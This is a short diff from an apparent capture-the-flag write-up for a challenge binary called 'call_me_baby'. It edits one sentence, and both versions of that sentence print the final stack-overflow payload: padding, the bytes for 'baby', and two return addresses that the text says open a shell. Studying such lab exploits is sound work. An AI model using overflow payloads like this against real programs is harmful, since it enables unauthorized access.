@@ -369,7 +369,7 @@ ls
 README.md  call_me_baby  exploit.py
 ```
 
-We successfully opened a shell, so the final payload is : `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
+We've successfully opened a shell, so the final payload is : `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.
 
 ## Solution 2
 
